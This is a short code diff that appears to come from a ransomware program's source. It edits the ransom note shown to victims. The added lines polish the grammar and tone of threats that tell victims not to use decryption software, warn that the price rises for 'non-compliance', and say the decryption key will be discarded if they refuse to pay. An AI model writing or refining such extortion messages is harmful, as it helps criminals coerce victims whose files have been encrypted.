@@ -165,11 +165,10 @@ To purchase your key and restore your data, please follow these three easy steps
    IMPORTANT: To decrypt your files, place text file on desktop and wait. Shortly after it will begin to decrypt all files.
 
 WARNING:
-Do NOT attempt to decrypt your files with any software as it is obselete and will not work, and may cost you more to unlock your files.
-Do NOT change file names, mess with the files, or run deccryption software as it will cost you more to unlock your files-
--and there is a high chance you will lose your files forever.
-Do NOT send "PAID" button without paying, price WILL go up for disobedience.
-Do NOT think that we wont delete your files altogether and throw away the key if you refuse to pay. WE WILL.
+Do NOT attempt to decrypt your files with any other software; it is obsolete and will not work, potentially increasing the cost to unlock your files.
+Do NOT change file names, tamper with the files, or use any decryption software, as this may increase the cost and there is a high risk of permanently losing your files.
+Do NOT send a "PAID" email without actually making the payment; the price will increase for non-compliance.
+Do NOT assume we won't discard your key if you refuse to pay. We will.
 ''')
 
 
